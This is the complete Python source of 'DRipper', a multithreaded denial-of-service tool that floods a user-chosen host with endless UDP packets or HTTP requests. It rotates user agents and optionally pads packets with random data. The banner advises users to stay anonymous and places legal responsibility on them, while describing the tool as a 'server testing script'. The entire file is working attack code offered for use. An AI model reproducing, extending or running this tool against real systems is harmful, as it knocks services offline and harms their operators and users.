import random
import socket
import string
import signal
import sys
import threading
import time
import urllib.request
from dataclasses import dataclass
from optparse import OptionParser

USAGE = 'Usage: python %prog [options] arg'
EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'


@dataclass
class Context:
    """Class for passing a context to a parallel processes."""
    host: str = ''
    port: int = 80
    threads: int = 100
    random_packet_len: bool = False
    attack_method: str = ''
    protocol: str = 'http://'
    url: str = ''

    user_agents: list[str] = ''
    base_headers = ''
    headers = {}


def init_context(_ctx, args):
    """Initialize Context from Input args."""
    _ctx.host = args[0].host
    _ctx.port = args[0].port
    _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"

    _ctx.threads = args[0].threads

    _ctx.attack_method = args[0].attack_method
    _ctx.random_packet_len = bool(args[0].random_packet_len)

    _ctx.user_agents = readfile('useragents.txt')
    _ctx.base_headers = readfile('headers.txt')
    _ctx.headers = set_headers_dict(_ctx.base_headers)


def readfile(filename: str):
    """Read string from file."""
    file = open(filename, "r")
    content = file.readlines()
    file.close()

    return content


def set_headers_dict(base_headers: list[str]):
    """Set headers for the request"""
    headers_dict = {}
    for line in base_headers:
        parts = line.split(':')
        headers_dict[parts[0]] = parts[1].strip()

    return headers_dict


def get_random_string(len_from, len_to):
    """Random string with different length"""
    length = random.randint(len_from, len_to)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))

    return result_str


def get_random_port():
    ports = [22, 53, 80, 443]
    return random.choice(ports)


def down_it_udp(_ctx):
    i = 1
    while True:
        extra_data = get_random_string(0, 5000) if _ctx.random_packet_len else ''

        packet = str(
            "GET / HTTP/1.1\nHost: " + _ctx.host
            + "\n\n User-Agent: "
            + random.choice(_ctx.user_agents)
            + "\n" + _ctx.base_headers[0]
            + "\n\n" + extra_data).encode('utf-8')

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # p = int(_ctx.port) if _ctx.port else get_random_port()
        try:
            sock.sendto(packet, (_ctx.host, _ctx.port))
        except socket.gaierror:
            print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
        else:
            print('\033[92m Packet was sent \033[0;0m')
        sock.close()

        if _ctx.port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=connect_host, args=[_ctx.host, _ctx.port])
                thread.daemon = True
                thread.start()
        time.sleep(.01)


def down_it_http(_ctx):
    while True:
        http_headers = _ctx.headers
        http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()

        try:
            urllib.request.urlopen(
                urllib.request.Request(_ctx.url, headers=http_headers))
        except:
            print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
                  " Program will continue working.\033[0m")
        else:
            print('\033[92m HTTP-Request was done \033[0;0m')

        time.sleep(.01)


def logo():
    print(''' \033[0;95m

██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗
██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

It is the end user's responsibility to obey all applicable laws.
It is just like a server testing script and Your IP is visible. Please, make sure you are anonymous!
    \033[0m ''')


def usage(parser):
    """Wrapper for Logo with help."""
    logo()
    parser.print_help()
    sys.exit()


def parse_args(parser):
    """Initialize command line arguments parser and parse CLI arguments."""
    parser_add_options(parser)

    return parser.parse_args()


def parser_add_options(parser):
    """Add options to a parser."""
    parser.add_option('-p', '--port',
                      dest='port', type='int', default=80,
                      help='port (default: 80)')
    parser.add_option('-t', '--threads',
                      dest='threads', type='int', default=100,
                      help='threads (default: 100)')
    parser.add_option('-r', '--random_len',
                      dest='random_packet_len', type='int',
                      help='Send random packets with random length')
    parser.add_option('-m', '--method',
                      dest='attack_method', type='str', default='udp',
                      help='Attack method: UDP (default), HTTP')
    parser.add_option('-s', '--server',
                      dest='host',
                      help='Attack to server IP')


def check_host(host):
    """Check Server IP."""
    error_msg = "\033[91mCheck server IP and port! Wrong format of server name or no connection.\033[0m"
    if not host:
        print(error_msg)
        exit(1)

    try:
        socket.gethostbyname(host)
    except:
        print(error_msg)
        exit(1)


def connect_host(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, int(port)))
    except:
        print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
              " Program will continue send UDP-packets to the destination.\033[0m")


def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2:
        usage(parser)

    _ctx = Context()
    init_context(_ctx, args)

    check_host(_ctx.host)
    connect_host(_ctx.host, _ctx.port)

    # p = str(_port) if _port else '(22, 53, 80, 443)'
    print("\033[92m", _ctx.host, " port: ", _ctx.port, " threads: ", _ctx.threads, "\033[0m")
    print("\033[94mPlease wait...\033[0m")

    time.sleep(3)

    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
        elif _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        thread_pool[i].daemon = True  # if thread is exist, it dies
        thread_pool[i].start()

    while True:
        time.sleep(.1)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:  # The user hit Control-C
        sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
        sys.stderr.flush()
        # Control-C is fatal error signal 2, for more see
        # https://tldp.org/LDP/abs/html/exitcodes.html
        sys.exit(128 + signal.SIGINT)
    except RuntimeError as exc:
        sys.stderr.write(f'\n{exc}\n\n')
        sys.stderr.flush()
        sys.exit(1)
